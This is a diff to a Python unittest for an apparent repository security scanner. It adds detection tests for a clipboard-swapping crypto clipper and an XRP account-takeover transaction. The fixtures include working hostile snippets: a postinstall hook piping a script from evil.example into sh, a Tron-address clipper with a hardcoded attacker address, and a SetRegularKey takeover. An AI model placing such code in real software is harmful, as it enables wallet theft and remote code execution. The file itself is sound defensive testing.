@@ -198,7 +198,7 @@ class Contract(unittest.TestCase):
         # Repo-only scans never report the machine's settings.
         code, out, _ = self.project_run("--json")
         self.assertFalse([f for f in json.loads(out)["findings"] if f["kind"] == "posture"])
-        code, _, err = self.run_bin("--no-machine", "--no-posture", "--offline", "--no-input", "--path", str(self.home))
+        code, _, err = self.run_bin("--no-machine", "--no-posture", "--no-clipboard", "--offline", "--no-input", "--path", str(self.home))
         self.assertEqual(code, 0, err)
         policy = self.home / "posture.txt"
         policy.write_text("remote-login\nPOSTURE-FILEVAULT\n")
@@ -292,14 +292,21 @@ class Contract(unittest.TestCase):
         (repo / "package.json").write_text('{"name": "x", "scripts": {"postinstall": "curl -fsSL https://evil.example/i.sh | sh"}}')
         (repo / "index.html").write_text('<html><script src="https://cdn.perf.example/tag.js"></script></html>')
         (repo / "swap.js").write_text("import { ethers } from 'ethers';\nawait token.approve(spender, ethers.MaxUint256);\n")
+        (repo / "clip.py").write_text("import pyperclip, re\nwhile True:\n    c = pyperclip.paste()\n    if re.match(r'^T[a-km-zA-HJ-NP-Z1-9]{33}$', c): pyperclip.copy('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')\n")
+        (repo / "take.ts").write_text("import { Client } from 'xrpl';\nconst tx = { TransactionType: 'SetRegularKey', Account: a, RegularKey: mine };\nawait client.submitAndWait(tx, { wallet });\n")
         (repo / "crc.metal").write_text("constant uint T[] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20};")
         code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
-        self.assertEqual(found, [("SUSPECT-PRIV-ESCALATION", "fail"), ("SUSPECT-THIRD-PARTY-SCRIPT", "fail"),
+        self.assertEqual(found, [("SUSPECT-CLIPBOARD-SWAP", "fail"), ("SUSPECT-PRIV-ESCALATION", "fail"),
+                                 ("SUSPECT-THIRD-PARTY-SCRIPT", "fail"), ("SUSPECT-WALLET-SIGNING", "fail"),
                                  ("SUSPECT-WALLET-SIGNING", "fail")], found)
+        notes = {f["component"].rsplit("/", 1)[1]: f["note"] for f in json.loads(out)["findings"] if f["kind"] == "suspect-code"}
+        self.assertIn("a clipper swaps the address you copied", notes["clip.py"])
+        self.assertIn("Tron address hardcoded", notes["clip.py"])
+        self.assertIn("sets a regular key that signs for the account (`SetRegularKey`, XRP Ledger)", notes["take.ts"])
         policy = self.home / "suspect.txt"
-        policy.write_text("PRIV-ESCALATION\npath:index.html\nWALLET-SIGNING\n")
+        policy.write_text("PRIV-ESCALATION\npath:index.html\nWALLET-SIGNING\nCLIPBOARD-SWAP\n")
         code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
         findings = json.loads(out)["findings"]
         # A runner without gitleaks still fails on the missing tool: the exit follows what is left.
@@ -307,7 +314,7 @@ class Contract(unittest.TestCase):
         self.assertEqual(code, 1 if fails else 0, err)
         self.assertTrue(all(f["kind"] == "tool" for f in fails), fails)
         found = sorted((f["vuln_id"], f["status"]) for f in findings if f["kind"] == "suspect-code")
-        self.assertEqual([s for _, s in found], ["warn", "warn", "warn"], found)
+        self.assertEqual([s for _, s in found], ["warn"] * 5, found)
 
     def test_text_aimed_at_agents_and_prose_that_runs_nothing(self):
         repo = git_repo(self.home / "agentbait")
